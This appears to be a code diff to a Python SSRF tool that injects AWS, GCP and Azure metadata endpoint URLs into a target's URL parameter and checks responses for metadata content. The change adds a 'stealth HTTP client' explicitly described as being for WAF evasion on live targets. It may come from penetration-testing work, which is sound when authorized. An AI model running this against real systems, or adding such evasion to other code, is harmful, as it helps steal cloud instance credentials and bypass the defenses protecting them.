@@ -3,10 +3,25 @@
 
 Tests for cloud metadata endpoint access via SSRF.
 Supports AWS, GCP, and Azure metadata endpoints.
+
+Uses stealth HTTP client for WAF evasion on live targets.
 """
 
-import requests
 from typing import Dict, Any, List, Optional
+
+# Import stealth HTTP client for WAF evasion
+try:
+    from tools.http_client import safe_get, safe_post, get_stealth_session
+    USE_STEALTH = True
+except ImportError:
+    import requests
+    USE_STEALTH = False
+    
+    def safe_get(url, **kwargs):
+        return requests.get(url, **kwargs)
+    
+    def safe_post(url, **kwargs):
+        return requests.post(url, **kwargs)
 
 
 def test_aws_metadata(ssrf_url: str, callback_url: Optional[str] = None) -> Dict[str, Any]:
@@ -36,7 +51,7 @@ def test_aws_metadata(ssrf_url: str, callback_url: Optional[str] = None) -> Dict
         try:
             # Inject metadata endpoint into SSRF
             test_url = f"{ssrf_url}?url={endpoint}"
-            resp = requests.get(test_url, timeout=10)
+            resp = safe_get(test_url, timeout=10)
             
             # Check for AWS metadata indicators
             content = resp.text.lower()
@@ -90,7 +105,7 @@ def test_gcp_metadata(ssrf_url: str, callback_url: Optional[str] = None) -> Dict
     for endpoint in metadata_endpoints:
         try:
             test_url = f"{ssrf_url}?url={endpoint}"
-            resp = requests.get(
+            resp = safe_get(
                 test_url,
                 headers={"Metadata-Flavor": "Google"},
                 timeout=10
@@ -144,7 +159,7 @@ def test_azure_metadata(ssrf_url: str, callback_url: Optional[str] = None) -> Di
     for endpoint in metadata_endpoints:
         try:
             test_url = f"{ssrf_url}?url={endpoint}"
-            resp = requests.get(
+            resp = safe_get(
                 test_url,
                 headers={"Metadata": "true"},
                 timeout=10
@@ -216,7 +231,7 @@ def test_direct_metadata_endpoints(base_url: str) -> Dict[str, Any]:
             elif provider == "azure":
                 headers["Metadata"] = "true"
             
-            resp = requests.get(url, headers=headers, timeout=5)
+            resp = safe_get(url, headers=headers, timeout=5)
             
             if resp.status_code == 200:
                 content = resp.text.lower()
